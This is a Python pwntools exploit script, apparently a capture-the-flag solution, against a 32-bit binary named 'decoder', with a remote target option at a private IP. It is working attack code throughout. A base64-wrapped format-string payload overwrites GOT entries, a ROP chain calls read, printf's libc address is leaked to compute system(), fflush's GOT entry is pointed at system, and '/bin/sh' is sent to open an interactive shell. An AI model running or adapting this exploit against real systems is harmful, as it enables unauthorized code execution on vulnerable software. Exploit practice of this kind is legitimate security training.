#!/usr/bin/env python
# coding=utf-8
from pwn import *
import base64

slog = 0
local = 1
debug = 1

if slog: context.log_level = True
if local:
    p = process('./decoder')
    libc = ELF('/lib32/libc-2.19.so')
else:
    p = remote('172.16.1.10', 20000)
    libc = ELF('./lib/i386-linux-gnu/libc-2.19.so')

if local and debug:
    gdb.attach(p, open('debug'))

elf = ELF('decoder')

printf_got = elf.got['printf']		#  0x80484c0
printf_plt = elf.symbols['printf'] 
read_addr = elf.symbols['read']
fflush_plt = elf.symbols['fflush']

realloc_got = elf.got['realloc']
fflush_got = elf.got['fflush']

main_addr = 0x8048b37

print('fflush_got = ' + hex(fflush_got))
print('printf_plt = ' + hex(printf_plt))


# s=base64.b64encode('%0200d%20$n')
# gadget 

addesp_72 = 0x08048b31

# addesp_16 = 0x08048605 Not used


# exec_fflush: 0x8048c5f
# got_fflush: 0x804b014
rodata = 0x8048de0 # '%d:%s'
bss_addr = 0x804b050

s = base64.b64encode('%02052d%20$hn%033581d%21$hn%22$x')  # add_esp

payload = s + (13 - len(s) / 4) * p32(0) + p32(addesp_72)+ p32(main_addr) + p32(rodata) + p32(1) + p32(printf_got)
# printf(rodata, '1', printf_got) 
# 0xffa8a3f4 
payload += p32(fflush_got + 2) + p32(fflush_got) + p32(fflush_got) 

payload += p32(0x1) * 0xc  + p32(read_addr) + p32(addesp_72) + p32(0) + p32(fflush_got) + p32(4)   #0xffa8a434 -> read

payload += p32(0x2) * 0xf + p32(read_addr) + p32(addesp_72) + p32(0) + p32(bss_addr) + p32(8)

payload += p32(0x3) * 0xf + p32(fflush_plt) + p32(0xdeadbeef) + p32(bss_addr)

# gdb.attach(p, open('debug'))

p.recvuntil('DECODER\n')
p.sendline(payload)

p.recvuntil(':')
printf_addr = u32(p.recv(4))

system_addr = printf_addr + libc.symbols['system'] - libc.symbols['printf']
#binsh_addr = printf_addr + next(libc.search('/bin/sh')) - libc.symbols['printf']

print('system_addr = ' + hex(system_addr))
#print('binsh_addr = ' + hex(binsh_addr))

p.send(p32(system_addr))
p.send("/bin/sh\0")

p.interactive()


